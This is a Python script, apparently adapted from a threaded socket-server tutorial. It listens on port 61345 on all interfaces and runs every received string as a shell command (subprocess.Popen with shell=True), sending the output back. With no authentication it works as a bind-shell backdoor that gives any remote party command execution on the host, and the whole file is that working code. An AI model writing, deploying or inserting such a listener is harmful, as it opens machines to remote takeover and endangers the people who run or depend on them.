import socket
from _thread import *
import threading 
# thread fuction 
# print_lock = threading.Lock()   
def threaded(c): 
    while True: 
    # data received from client 
      data = c.recv(1024) 
      if not data: 
        print('Bye') 
          
        # lock released on exit 
        # print_lock.release() 
        break
      from subprocess import check_output
      import subprocess
        # subprocess.call(data)
      process = subprocess.Popen(str(data.decode("utf-8")), stdout=subprocess.PIPE, stderr=None, shell=True)

        #Launch the shell command:
      output = process.communicate()

      print (output[0].decode("utf-8"))
        # data = str(data).upper()
        # out = check_output(str(data))
        # print (str(out))
        # print ("sending" + str(data))
      c.send(output[0])
# connection closed 
    c.close() 

def Main(): 
    host = "" 
  
    # reverse a port on your computer 
    # in our case it is 12345 but it 
    # can be anything 
    port = 61345
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.bind((host, port)) 
    print("socket binded to post", port) 
  
    # put the socket into listening mode 
    s.listen(5) 
    print("socket is listening") 
  
    # a forever loop until client wants to exit 
    while True: 
  
        # establish connection with client 
        c, addr = s.accept() 
  
        # lock acquired by client 
        # print_lock.acquire() 
        print('Connected to :', addr[0], ':', addr[1])
        # Start a new thread and return its identifier 
        start_new_thread(threaded, (c,)) 
    s.close() 

if __name__ == '__main__':
  Main()